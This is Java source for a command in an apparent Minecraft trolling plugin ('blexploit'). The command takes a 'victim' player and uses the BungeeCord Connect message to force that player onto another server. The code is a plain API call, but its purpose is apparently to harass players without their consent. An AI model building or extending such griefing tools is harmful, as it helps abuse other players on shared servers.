package de.blexploit.command.cmds;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.Start;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Bungeecord extends Command {

	public Bungeecord() {
		super("bungeecord", "Schicke jemanden auf einen anderen Server", TabManager.INSERT_PLAYERNAME, "Serverip");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 3) {
			Player victim = api.Get.victim(args, 1);
			if (victim != null) {
				String server = args[2];
				if (teleportServer(victim, server)) {
					this.SpielerInfo(mt,
							"hat §c" + victim.getName() + CHAT_COLOR + " mit dem Server '" + server + "' verbunden!");
				} else {
					mt.fehler(Fehler.UNKNOWN_EXCEPTION);
					mt.fehler("Möglicherweise handelt es sich hier nicht um einen Bungeecord Server.");
				}
			} else {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
				mt.benutze(this);
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}

	private boolean teleportServer(Player p, String server) {
		try {
			ByteArrayOutputStream b = new ByteArrayOutputStream();
			DataOutputStream out = new DataOutputStream(b);

			out.writeUTF("Connect");
			out.writeUTF(server);
			p.sendPluginMessage(Start.instance, "BungeeCord", b.toByteArray());
			return true;
		} catch (Exception e) {
			return false;
		}
	}
}
